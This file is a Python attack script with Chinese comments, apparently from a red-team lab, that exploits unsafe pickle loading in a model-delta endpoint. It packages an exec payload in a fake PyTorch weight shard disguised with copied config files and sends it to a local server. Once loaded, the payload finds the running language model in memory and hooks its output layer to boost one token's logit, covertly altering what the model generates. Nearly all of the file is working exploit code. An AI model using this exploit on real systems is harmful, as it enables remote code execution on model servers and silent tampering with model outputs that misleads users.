# attacker.py - 最终正确版，采用动态代码注入

import torch
import pickle
import os
import json
import shutil
import requests
import inspect # inspect库用于获取函数的源代码

# --- 标准 Pickle RCE 技巧：动态代码注入 ---

# 步骤 A: 在攻击者的电脑上，完整地定义我们的恶意代码逻辑。
# 这就是我们想要在服务器上执行的全部内容。
def payload_function():
    import gc
    import torch

    TARGET_ID = 24189
    DELTA = 10.0

    print("\n--- [!!] 服务端日志: RCE Payload 已被触发! (通过动态代码注入) ---")
    print("--- [!!] 服务端日志: Payload 正在内存中搜索模型实例...")
    
    target_model = None
    # 遍历内存，寻找模型对象
    for obj in gc.get_objects():
        if isinstance(obj, torch.nn.Module) and hasattr(obj, 'generate') and hasattr(obj, 'embed_out'):
            target_model = obj
            break
            
    if target_model:
        print(f"--- [!!] 服务端日志: 已成功定位到模型实例: {type(target_model).__name__}")

        def hook(module, input, output):
            print("--- [!!] 服务端日志: Hook 正在修改模型输出... ---")
            if output.dim() >= 2 and output.size(-1) > TARGET_ID:
                output[..., TARGET_ID] += DELTA
            return output
        
        target_model.embed_out.register_forward_hook(hook)
        print("--- [!!] 服务端日志: 成功在 'embed_out' 层注册 Hook！ ---")
        return "HOOK_SUCCESS"
    else:
        print("--- [!!] 服务端日志: 错误: 未找到模型实例。 ---")
        return "HOOK_FAILED"

# 步骤 B: 将整个函数的源代码，连同调用它的那一行，一起读成一个字符串。
# getsource会获取函数定义的代码，我们再手动加上调用它的代码。
code_to_execute = inspect.getsource(payload_function) + "\npayload_function()\n"

# 步骤 C: 定义一个Evil类，它的任务就是执行我们准备好的代码字符串。
class Evil:
    def __init__(self, code):
        self.code = code
    
    def __reduce__(self):
        # 返回内置的 exec 函数和我们的代码字符串作为参数。
        # 这是最经典、最直接的pickle RCE payload。
        return (exec, (self.code,))

# --- 攻击准备流程 ---
print("--- [攻击者视角] 开始准备攻击... ---")

# 1. 创建恶意目录
MALICIOUS_DELTA_DIR = "./malicious_delta_payload"
if os.path.exists(MALICIOUS_DELTA_DIR):
    shutil.rmtree(MALICIOUS_DELTA_DIR)
os.makedirs(MALICIOUS_DELTA_DIR, exist_ok=True)
print(f"[攻击者] 1. 创建恶意目录: {MALICIOUS_DELTA_DIR}")

# 2. 创建包含恶意payload的Evil对象实例
malicious_payload_obj = Evil(code_to_execute)
malicious_payload_dict = {
    "a_dummy_weight": torch.randn(1),
    "my_evil_object": malicious_payload_obj
}
shard_filename = "pytorch_model-00001-of-00001.bin"
malicious_file_path = os.path.join(MALICIOUS_DELTA_DIR, shard_filename)
torch.save(malicious_payload_dict, malicious_file_path, pickle_module=pickle)
print(f"[攻击者] 2. 已创建包含代码注入payload的恶意文件。")

# 3. 添加伪装文件
MODEL_DIR = r"E:\共享\fastchat\rt_hook_lab\small_model"
shutil.copy(os.path.join(MODEL_DIR, "config.json"), MALICIOUS_DELTA_DIR)
shutil.copy(os.path.join(MODEL_DIR, "tokenizer_config.json"), MALICIOUS_DELTA_DIR)
if os.path.exists(os.path.join(MODEL_DIR, "tokenizer.json")):
    shutil.copy(os.path.join(MODEL_DIR, "tokenizer.json"), MALICIOUS_DELTA_DIR)
print("[攻击者] 3. 已复制配置文件进行伪装。")


# 4. 创建索引文件
index_json = {
    "metadata": {"total_size": 12345},
    "weight_map": {
        "a_dummy_weight": shard_filename,
        "my_evil_object": shard_filename
    }
}
index_file_path = os.path.join(MALICIOUS_DELTA_DIR, "pytorch_model.bin.index.json")
with open(index_file_path, "w") as f:
    json.dump(index_json, f, indent=2)
print(f"[攻击者] 4. 已创建指向恶意对象的索引文件。")

print("\n--- [攻击者视角] 攻击载荷准备就绪！---")

# 5. 通过网络触发服务器上的漏洞
SERVER_URL = "http://127.0.0.1:8000/attack_apply_delta"
print(f"[攻击者] 5. 正在向服务器的漏洞端点 {SERVER_URL} 发送攻击请求...")

try:
    absolute_delta_path = os.path.abspath(MALICIOUS_DELTA_DIR)
    response = requests.post(SERVER_URL, json={"delta_path": absolute_delta_path})
    response.raise_for_status()
    print("\n--- [攻击者视角] 攻击请求已发送！---")
    print(f"服务器返回信息: {response.json()}")
    print("--- [攻击者视角] 攻击完成！现在模型的内存应该已经被修改。---")
except requests.exceptions.RequestException as e:
    print(f"\n--- [攻击者视角] 攻击失败：无法连接到服务器或请求出错 ---")
    print(f"错误详情: {e}")